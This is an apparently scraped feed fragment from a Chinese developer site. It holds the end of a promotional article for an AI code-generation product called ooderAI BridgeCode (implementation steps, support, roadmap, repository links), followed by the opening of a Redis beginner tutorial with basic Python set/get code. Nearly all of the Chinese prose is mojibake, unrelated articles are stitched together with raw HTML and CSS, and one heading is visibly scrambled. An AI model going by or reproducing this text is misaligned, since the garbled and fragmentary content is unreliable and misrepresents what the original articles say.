<p>é‡‡ç”¨ä½ä»£ç å¼€å‘æ¨¡å¼çš„ä¼ä¸šæˆ–å›¢é˜Ÿï¼ŒBridgeCode é…å¥—çš„128ä¸ªå¼€æºå¯è§†åŒ–ç»„ä»¶ã€ä½ä»£ç ç»„ä»¶ç”Ÿæˆå™¨ï¼Œå¯è¿›ä¸€æ­¥ä¸°å¯Œä½ä»£ç å¼€å‘çš„ç»„ä»¶åº“ï¼Œé™ä½ä½ä»£ç å¼€å‘é—¨æ§›ï¼ŒåŒæ—¶è‡ªå­¦ä¹ èƒ½åŠ›å¯é€‚é…ä¼ä¸šä½ä»£ç å¼€å‘è§„èŒƒï¼Œç”Ÿæˆè´´åˆä¼ä¸šéœ€æ±‚çš„ä½ä»£ç ç»„ä»¶ä¸è¡”æ¥ä»£ç ï¼Œæå‡ä½ä»£ç å¼€å‘æ•ˆç‡ä¸è´¨é‡ã€‚</p>
<h3 data-id="heading-23">5.5 å¤šæŠ€æœ¯æ ˆååŒå¼€å‘åœºæ™¯</h3>
<p>ä¼ä¸šå†…éƒ¨å­˜åœ¨å¤šä¸ªæŠ€æœ¯æ ˆï¼ˆå¦‚å‰ç«¯Vue/Reactã€åç«¯Java/Pythonï¼‰ï¼Œå›¢é˜ŸååŒå¼€å‘å›°éš¾çš„åœºæ™¯ï¼ŒBridgeCode æ— æŠ€æœ¯ç»‘å®šã€å¤šæŠ€æœ¯æ ˆé€‚é…çš„ç‰¹ç‚¹ï¼Œå¯è®©ä¸åŒæŠ€æœ¯æ ˆçš„å›¢é˜Ÿå…±ç”¨ä¸€å¥—å·¥å…·ï¼Œç”Ÿæˆé€‚é…å„è‡ªæŠ€æœ¯æ ˆçš„ä»£ç ï¼Œæ‰“é€šååŒå¼€å‘æ–­å±‚ï¼Œé™ä½æ²Ÿé€šæˆæœ¬ã€‚</p>
<h2 data-id="heading-24">å…­ã€å®æ–½ä¸æ”¯æŒï¼šåŠ©åŠ›ä¼ä¸šå¿«é€Ÿè½åœ°ï¼Œé•¿æœŸèµ‹èƒ½</h2>
<p>ooderAI BridgeCode è‡´åŠ›äºä¸ºä¼ä¸šæä¾›â€œå…¨æµç¨‹ã€å…¨æ–¹ä½â€çš„å®æ–½ä¸æŠ€æœ¯æ”¯æŒï¼Œç¡®ä¿ä¼ä¸šèƒ½å¤Ÿå¿«é€Ÿè½åœ°äº§å“ã€ç†Ÿç»ƒä½¿ç”¨æ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒæ—¶ä¾æ‰˜å¼€æºç¤¾åŒºä¸ä¸“ä¸šå›¢é˜Ÿï¼Œä¸ºä¼ä¸šé•¿æœŸå‘å±•æä¾›æŠ€æœ¯ä¿éšœã€‚</p>
<h3 data-id="heading-25">6.1 å®æ–½æµç¨‹</h3>
<ol>
<li><strong>éœ€æ±‚å¯¹æ¥</strong>ï¼šä¸“ä¸šå›¢é˜Ÿå¯¹æ¥ä¼ä¸šï¼Œäº†è§£ä¼ä¸šæŠ€æœ¯æ ˆã€ä»£ç ç‰¹ç‚¹ã€ç¼–ç¨‹éœ€æ±‚ä¸ç—›ç‚¹ï¼Œåˆ¶å®šä¸ªæ€§åŒ–å®æ–½æ–¹æ¡ˆï¼›</li>
<li><strong>äº§å“éƒ¨ç½²</strong>ï¼šæä¾›è¯¦ç»†çš„éƒ¨ç½²æ–‡æ¡£ä¸WebåŒ–éƒ¨ç½²æŒ‡å¼•ï¼Œæ”¯æŒæœ¬åœ°éƒ¨ç½²ã€äº‘ç«¯éƒ¨ç½²ï¼Œå¿«é€Ÿå®Œæˆäº§å“éƒ¨ç½²ä¸ç¯å¢ƒé…ç½®ï¼›</li>
<li><strong>è°ƒè¯•é€‚é…</strong>ï¼šååŠ©ä¼ä¸šå®Œæˆ BridgeCode çš„è‡ªå­¦ä¹ è°ƒè¯•ï¼Œç¡®ä¿ä»£ç ç”Ÿæˆã€ç³»ç»Ÿè¡”æ¥ç¬¦åˆä¼ä¸šéœ€æ±‚ï¼Œä¼˜åŒ–Webç«¯æ“ä½œä½“éªŒï¼›</li>
<li><strong>åŸ¹è®­æŒ‡å¯¼</strong>ï¼šé’ˆå¯¹ä¼ä¸šå›¢é˜Ÿå¼€å±•ä¸“é¡¹åŸ¹è®­ï¼Œæ¶µç›–äº§å“æ ¸å¿ƒåŠŸèƒ½ã€Webç«¯æ“ä½œæ–¹æ³•ã€æŠ€èƒ½åŒ…ä½¿ç”¨ã€Agent éƒ¨ç½²ç­‰å†…å®¹ï¼Œç¡®ä¿å›¢é˜Ÿç†Ÿç»ƒä¸Šæ‰‹ï¼›</li>
<li><strong>è½åœ°ä¸Šçº¿</strong>ï¼šååŠ©ä¼ä¸šå®Œæˆäº§å“è½åœ°ä¸Šçº¿ï¼Œå®æ—¶ç›‘æ§è¿è¡ŒçŠ¶æ€ï¼ŒåŠæ—¶è§£å†³ä¸Šçº¿è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼›</li>
<li><strong>é•¿æœŸä¼˜åŒ–</strong>ï¼šæ ¹æ®ä¼ä¸šä¸šåŠ¡å‘å±•ä¸æŠ€æœ¯å‡çº§éœ€æ±‚ï¼Œæä¾›é•¿æœŸä¼˜åŒ–å»ºè®®ï¼ŒååŠ©ä¼ä¸šè¿›è¡Œäº§å“äºŒæ¬¡å¼€å‘ä¸åŠŸèƒ½æ‰©å±•ã€‚</li>
</ol>
<p>â€‹</p>
<h4 data-id="heading-26">6.1.1 äº§å“å®æ–½å…¨æµç¨‹ebç»˜å›¾</h4>
<p>ä»¥ä¸‹ä¸º ooderAI BridgeCode ä¼ä¸šå®æ–½å…¨æµç¨‹Wç¤ºæ„å›¾ï¼š</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/138de841bcdf45a4bc66cf2e5b743d6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770900704&amp;x-signature=fhcGEHO6mRQ%2B06ZTI2OqTc4TG7o%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h3 data-id="heading-27">6.2 æŠ€æœ¯æ”¯æŒ</h3>
<ul>
<li><strong>å¼€æºç¤¾åŒºæ”¯æŒ</strong>ï¼šä¼ä¸šå¯åœ¨å¼€æºç¤¾åŒºè·å–æŠ€æœ¯æ–‡æ¡£ã€æ“ä½œæ•™ç¨‹ã€å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶å¯ä¸å…¶ä»–ä¼ä¸šã€å¼€å‘è€…äº¤æµç»éªŒï¼Œè·å–æœ€æ–°å‡çº§åŒ…ï¼›</li>
<li><strong>åœ¨çº¿æŠ€æœ¯æ”¯æŒ</strong>ï¼šæä¾›7Ã—12å°æ—¶åœ¨çº¿æŠ€æœ¯å’¨è¯¢æœåŠ¡ï¼Œå¿«é€Ÿå“åº”ä¼ä¸šé—®é¢˜ï¼ŒååŠ©è§£å†³äº§å“ä½¿ç”¨ã€éƒ¨ç½²ã€è°ƒè¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„éš¾é¢˜ï¼›</li>
<li><strong>å®šåˆ¶åŒ–æ”¯æŒ</strong>ï¼šé’ˆå¯¹ä¼ä¸šä¸ªæ€§åŒ–éœ€æ±‚ï¼Œæä¾›å®šåˆ¶åŒ–å¼€å‘ã€æµç¨‹ä¼˜åŒ–ã€Agent å®šåˆ¶ç­‰æœåŠ¡ï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°äº§å“ä¸ä¸šåŠ¡çš„æ·±åº¦é€‚é…ï¼›</li>
<li><strong>ç‰ˆæœ¬å‡çº§æ”¯æŒ</strong>ï¼šæŒç»­è¿­ä»£äº§å“ç‰ˆæœ¬ï¼Œä¼˜åŒ–æ ¸å¿ƒåŠŸèƒ½ã€æ–°å¢ç»„ä»¶ä¸èƒ½åŠ›ï¼Œä¸ºä¼ä¸šæä¾›å…è´¹ç‰ˆæœ¬å‡çº§æŒ‡å¯¼ï¼Œç¡®ä¿ä¼ä¸šå§‹ç»ˆä½¿ç”¨æœ€æ–°ã€æœ€ä¼˜è´¨çš„äº§å“åŠŸèƒ½ã€‚</li>
</ul>
<h2 data-id="heading-28">ä¸ƒã€æœªæ¥è§„åˆ’ï¼šæŒç»­è¿­ä»£ï¼Œèµ‹èƒ½ä¼ä¸šAIç¼–ç¨‹æ–°æœªæ¥</h2>
<p>ooderAI BridgeCode å°†å§‹ç»ˆä»¥ä¼ä¸šéœ€æ±‚ä¸ºæ ¸å¿ƒï¼Œä¾æ‰˜AIæŠ€æœ¯ä¸å¼€æºç”Ÿæ€ï¼ŒæŒç»­è¿­ä»£ä¼˜åŒ–äº§å“åŠŸèƒ½ï¼Œä¸æ–­æå‡äº§å“çš„é€‚é…æ€§ã€æ˜“ç”¨æ€§ä¸æ™ºèƒ½åŒ–æ°´å¹³ï¼ŒåŠ©åŠ›ä¼ä¸šåœ¨AIæ—¶ä»£å®ç°ç¼–ç¨‹æ•ˆç‡ä¸è´¨é‡çš„åŒé‡é£è·ƒï¼Œæœªæ¥è§„åˆ’ä¸»è¦èšç„¦ä»¥ä¸‹æ–¹å‘ï¼š</p>
<ul>
<li><strong>AIèƒ½åŠ›å‡çº§</strong>ï¼šä¼˜åŒ–è‡ªå­¦ä¹ ç®—æ³•ï¼Œæå‡ä»£ç ç”Ÿæˆçš„å‡†ç¡®æ€§ä¸æ•ˆç‡ï¼Œæ–°å¢AIä»£ç é‡æ„ã€AIéœ€æ±‚è½¬åŒ–ï¼ˆè‡ªç„¶è¯­è¨€è½¬ä»£ç ï¼‰ç­‰åŠŸèƒ½ï¼Œè¿›ä¸€æ­¥é‡Šæ”¾AIæŠ€æœ¯ä»·å€¼ï¼›</li>
<li><strong>ç»„ä»¶ä¸å·¥å…·æ‰©å±•</strong>ï¼šæŒç»­æ‰©å……å¯è§†åŒ–ç»„ä»¶åº“ï¼Œè®¡åˆ’æ–°å¢è‡³200+ç»„ä»¶ï¼Œè¦†ç›–æ›´å¤šå¼€å‘åœºæ™¯ï¼›åŒæ—¶ä¼˜åŒ–ä½ä»£ç ç»„ä»¶ç”Ÿæˆå™¨ï¼Œæå‡å¯è§†åŒ–å¼€å‘ä½“éªŒä¸çµæ´»æ€§ï¼›</li>
<li><strong>WebåŒ–ä½“éªŒä¼˜åŒ–</strong>ï¼šè¿›ä¸€æ­¥ç¾åŒ–Webç«¯æ“ä½œç•Œé¢ï¼Œæ–°å¢ä¸ªæ€§åŒ–ç•Œé¢é…ç½®ã€å¤šè¯­è¨€æ”¯æŒç­‰åŠŸèƒ½ï¼Œé€‚é…ä¸åŒä¼ä¸šçš„æ“ä½œä¹ æƒ¯ä¸éœ€æ±‚ï¼›</li>
<li><strong>ç”Ÿæ€èåˆæ·±åŒ–</strong>ï¼šåŠ å¼ºä¸ ooderAI ç”Ÿæ€çš„æ·±åº¦èåˆï¼ŒåŒæ—¶å¯¹æ¥æ›´å¤šä¸»æµå¼€å‘å·¥å…·ã€è¿ç»´ç³»ç»Ÿã€äº‘å¹³å°ï¼Œæ‰“é€ å…¨æ–¹ä½çš„ä¼ä¸šç¼–ç¨‹ç”Ÿæ€ä½“ç³»ï¼›</li>
<li><strong>å¼€æºç¤¾åŒºå»ºè®¾</strong>ï¼šæ‰©å¤§å¼€æºç¤¾åŒºè§„æ¨¡ï¼Œå¸å¼•æ›´å¤šå¼€å‘è€…å‚ä¸äº§å“è¿­ä»£ä¸ä¼˜åŒ–ï¼Œä¸°å¯Œç¤¾åŒºèµ„æºï¼Œä¸ºä¼ä¸šæä¾›æ›´å…¨é¢çš„æŠ€æœ¯æ”¯æŒï¼›</li>
<li><strong>è¡Œä¸šå®šåˆ¶åŒ–é€‚é…</strong>ï¼šé’ˆå¯¹é‡‘èã€åˆ¶é€ ã€äº’è”ç½‘ã€åŒ»ç–—ç­‰é‡ç‚¹è¡Œä¸šï¼Œå¼€å‘è¡Œä¸šä¸“å±æ¨¡æ¿ã€ç»„ä»¶ä¸ Agent æ–¹æ¡ˆï¼Œè¿›ä¸€æ­¥æå‡äº§å“çš„è¡Œä¸šé€‚é…æ€§ã€‚</li>
</ul>
<h2 data-id="heading-29">å…«ã€ç»“è¯­</h2>
<p>åœ¨AIæŠ€æœ¯é‡å¡‘ä¼ä¸šç¼–ç¨‹æ¨¡å¼çš„ä»Šå¤©ï¼Œé«˜æ•ˆã€çµæ´»ã€æ™ºèƒ½çš„ä»£ç æ¡†æ¶è§£å†³æ–¹æ¡ˆï¼Œæˆä¸ºä¼ä¸šæ•°å­—åŒ–è½¬å‹çš„æ ¸å¿ƒæ”¯æ’‘ã€‚ooderAI BridgeCode ä»¥â€œä¸ºä¼ä¸šå¿«é€Ÿæ„å»ºå±äºè‡ªå·±çš„AIç¡®å®šæ€§ä»£ç æ¡†æ¶ï¼ŒåŠ©åŠ›ä¼ä¸šç¼–ç¨‹â€ä¸ºæ ¸å¿ƒï¼Œå‡­å€Ÿè‡ªå­¦ä¹ çš„ä»£ç ç”Ÿæˆèƒ½åŠ›ã€AIæ—¶ä»£çš„æµç¨‹ä¼˜åŒ–èƒ½åŠ›ã€å¼€æºçµæ´»çš„äº§å“ç‰¹ç‚¹ä¸WebåŒ–çš„æ˜“ç”¨è®¾è®¡ï¼Œæ‰“ç ´ä¼ ç»Ÿä»£ç ç”Ÿæˆæ–¹æ¡ˆçš„å±€é™ï¼Œæ‰“é€šä¼ä¸šæŠ€æœ¯æ–­å±‚ï¼Œé™ä½å¼€å‘æˆæœ¬ï¼Œæå‡ç¼–ç¨‹æ•ˆç‡ï¼ŒåŠ©åŠ›ä¼ä¸šå®ç°AIåŒ–ç¼–ç¨‹è½¬å‹ã€‚</p>
<p>æœªæ¥ï¼ŒooderAI BridgeCode å°†æŒç»­è¿­ä»£ã€ä¸æ–­åˆ›æ–°ï¼Œä¾æ‰˜å¼€æºç”Ÿæ€ä¸ä¸“ä¸šå›¢é˜Ÿï¼Œä¸ºä¼ä¸šæä¾›æ›´ä¼˜è´¨ã€æ›´è´´åˆéœ€æ±‚çš„äº§å“ä¸æœåŠ¡ï¼Œä¸ä¼ä¸šæºæ‰‹ï¼Œå…±åŒå¼€å¯AIç¼–ç¨‹æ–°æœªæ¥ï¼ŒåŠ©åŠ›ä¼ä¸šåœ¨æ•°å­—åŒ–è½¬å‹çš„é“è·¯ä¸Šç¨³æ­¥å‰è¡Œã€‚</p>
<h2 data-id="heading-30">é™„å½•ï¼šäº§å“ç›¸å…³èµ„æº</h2>
<ul>
<li>å¼€æºç¤¾åŒºåœ°å€ï¼š</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foodercn%2Fsuper-Agent" target="_blank" title="https://github.com/oodercn/super-Agent" ref="nofollow noopener noreferrer">github.com/oodercn/supâ€¦</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FooderCN%2Fsuper-agent" target="_blank" title="https://gitee.com/ooderCN/super-agent" ref="nofollow noopener noreferrer">gitee.com/ooderCN/supâ€¦</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å…¨æ ˆè¿›é˜¶-rediså…¥é—¨å®æˆ˜æ¦‚å¿µç¯‡]]></title>    <link>https://juejin.cn/post/7603195960254513152</link>    <guid>https://juejin.cn/post/7603195960254513152</guid>    <pubDate>2026-02-05T12:00:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254513152" data-draft-id="7603043152673062927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å…¨æ ˆè¿›é˜¶-rediså…¥é—¨å®æˆ˜æ¦‚å¿µç¯‡"/> <meta itemprop="keywords" content="Python,Redis,åç«¯"/> <meta itemprop="datePublished" content="2026-02-05T12:00:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åªä¸æ˜æœˆå¬"/> <meta itemprop="url" content="https://juejin.cn/user/386661153249102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å…¨æ ˆè¿›é˜¶-rediså…¥é—¨å®æˆ˜æ¦‚å¿µç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/386661153249102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åªä¸æ˜æœˆå¬
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T12:00:48.000Z" title="Thu Feb 05 2026 12:00:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»28åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€é˜¶æ®µï¼šredisåŸºç¡€</h2>
<h4 data-id="heading-1">1. ç®€ä»‹</h4>
<p><code>Redis</code>æ˜¯ä¸€æ¬¾å¼€æºçš„ã€åŸºäºå†…å­˜çš„é”®å€¼å¯¹æ•°æ®åº“ï¼Œæ”¯æŒå°†å†…å­˜æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œè¿˜æä¾›äº†ä¸°å¯Œçš„æ•°æ®ç»“æ„ã€äº‹åŠ¡ã€å‘å¸ƒè®¢é˜…ç­‰åŠŸèƒ½ï¼Œè¢«å¹¿æ³›çš„ç”¨äºç¼“å­˜ã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¼šè¯å­˜å‚¨ç­‰åœºæ™¯ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªå‰ç«¯å¼€å‘ï¼Œå¯¹äº<code>Redis</code>ç¬¬ä¸€å½±å“å°±æ˜¯è¯»å†™æ“ä½œéå¸¸çš„å¿«ï¼Œå¸¸ç”¨äºä¸€äº›éœ€è¦å¿«é€Ÿè¯»å†™æ•°æ®çš„åœºæ™¯ï¼Œæ¯”å¦‚å­˜å‚¨ä¼šè¯<code>session</code>ã€‚<code>Redis</code>ä¹‹æ‰€ä»¥è¿™ä¹ˆå¿«ï¼Œåœ¨äº<code>Redis</code>åˆ©ç”¨äº†å†…å­˜æ“ä½œã€IOå¤šè·¯å¤ç”¨ã€é¿å…çº¿ç¨‹åˆ‡æ¢å¼€é”€ä¸‰å¤§æ ¸å¿ƒä¼˜åŠ¿ï¼Œè®©å•çº¿ç¨‹ä¹Ÿè¶³ä»¥æ”¯æ’‘è¶…é«˜å¹¶å‘ã€‚</p>
<p><code>Redis</code>å¹¶éçº¯å•çº¿ç¨‹ï¼Œåªæ˜¯åœ¨æ¥å—å®¢æˆ·è¯·æ±‚çš„æ ¸å¿ƒå¤„ç†æµç¨‹æ˜¯å•çº¿ç¨‹çš„ï¼Œåœ¨å¤„ç†æ…¢æ“ä½œï¼Œæ¯”å¦‚æŒä¹…åŒ–è¯»å†™ç£ç›˜ã€å¼‚æ­¥åˆ é™¤å¤§é”®ã€ä¸»ä»å¤åˆ¶çš„ç½‘ç»œåŒæ­¥ï¼Œä¼šå¯åŠ¨å¤šä¸ªè¾…åŠ©çº¿ç¨‹ã€‚ä¸ºå•¥å½“åˆ<code>Redis</code>ä¸æ˜¯è®¾è®¡æˆå¤šçº¿ç¨‹å‘¢ï¼Œä¸»è¦æ˜¯å•çº¿ç¨‹è®¾è®¡ç®€å•ï¼Œæ ¸å¿ƒé€»è¾‘éƒ½æ˜¯ä¸²è¡Œæ‰§è¡Œçš„ï¼Œåç»­çš„ç»´æŠ¤æˆæœ¬æä½ï¼ŒåŒæ—¶ä¹Ÿé¿å…äº†å¤šçº¿ç¨‹çš„æ­»é”å•Šï¼Œæ•°æ®ä¸€è‡´æ€§å•Šè¿™äº›éº»çƒ¦çš„é—®é¢˜ï¼›å†…å­˜çš„æ“ä½œè¶³å¤Ÿå¿«ï¼Œå¤šçº¿ç¨‹å¿…ç„¶ä¼šæ¶‰åŠåˆ°çº¿ç¨‹åˆ‡æ¢å’Œé”ç«äº‰ï¼Œè¿™äº›éƒ½ä¼šé™ä½æ•ˆç‡ï¼›IOçš„å¤šè·¯å¤ç”¨ï¼Œ<code>Redis</code>è¿è¡Œåœ¨ç½‘ç»œå±‚ï¼Œä½¿ç”¨çš„åŸºäº<code>Unix</code>ç³»ç»Ÿçš„IOå¤šè·¯å¤ç”¨æœºåˆ¶ï¼Œå°±æ˜¯ä¸»çº¿ç¨‹é€šè¿‡äº‹ä»¶å¾ªç¯æ¥ç›‘å¬æ‰€æœ‰å®¢æˆ·ç«¯çš„IOæ“ä½œï¼Œç»´æŠ¤ä¸€ä¸ªäº‹ä»¶é˜Ÿåˆ—å»å¤„ç†IOæ“ä½œï¼Œè¿™ç§å•çº¿ç¨‹éé˜»å¡çš„IOå¤šè·¯å¤ç”¨è®©<code>Redis</code>å¯ä»¥åŒæ—¶ç®¡ç†ä¸Šä¸‡çš„<code>TCP</code>è¿æ¥ã€‚</p>
<h4 data-id="heading-2">2.redisæ•°æ®åŸºæœ¬ç»“æ„</h4>
<p><code>Redis</code>åŸºæœ¬æ•°æ®ç»“æ„ä¸»è¦äº”ä¸ªï¼Œæ¥ä¸‹æ¥æŒ¨ä¸ªä»‹ç»ä¸‹</p>
<p>é¦–å…ˆå®‰è£…ä¸‹ç¯å¢ƒï¼š</p>
<pre><code class="hljs">pip install redis
</code></pre>
<p>å…ˆåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œç„¶åå®‰è£…ç›¸åº”çš„ä¾èµ–</p>
<pre><code class="hljs language-ini" lang="ini">import redis
â€‹
<span class="hljs-comment"># è¿æ¥åˆ°ä½ çš„çº¿ä¸Š Redis</span>
<span class="hljs-attr">r</span> = redis.Redis.from_url(
 Â  Â "redis://:xxx",
 Â  Â <span class="hljs-attr">decode_responses</span>=<span class="hljs-literal">True</span>, Â <span class="hljs-comment"># è¿”å› str è€Œä¸æ˜¯ bytes</span>
)
â€‹
<span class="hljs-comment"># è®¾ç½®ä¸€ä¸ª study:string çš„ key</span>
r.set("study:string", "hello redis from python")
â€‹
<span class="hljs-comment"># è¯»å‡ºæ¥éªŒè¯ä¸€ä¸‹</span>
<span class="hljs-attr">value</span> = r.get(<span class="hljs-string">"study:string"</span>)
print("study:<span class="hljs-attr">string</span> =<span class="hljs-string">", value)
</span></code></pre>
<h5 data-id="heading-3">2.1 String</h5>
<p><code>String</code>æ˜¯<code>Redis</code>æœ€åŸºç¡€ã€æœ€å¸¸ç”¨çš„æ•°æ®ç»“æ„ï¼Œæ‰€æœ‰çš„é”®å€¼å¯¹çš„<code>value</code>æœ¬è´¨ä¸Šéƒ½å¯ä»¥ä½¿ç”¨<code>String</code>æ¥å­˜å‚¨ï¼Œå•<code>key</code>æœ€å¤§å®¹é‡512Mï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ï¼Œæ”¯æŒä½è¿ç®—å’Œè¿‡æœŸç­–ç•¥ã€‚</p>
<p>æ¯”å¦‚å‰é¢çš„æ¡ˆä¾‹<code>r.set("study:string", "hello redis from python")</code>ï¼Œå°±æ˜¯è®¾ç½®ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>å¦‚æœè¦è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´çš„è¯ï¼Œä¹Ÿæ¯”è¾ƒç®€å•</p>
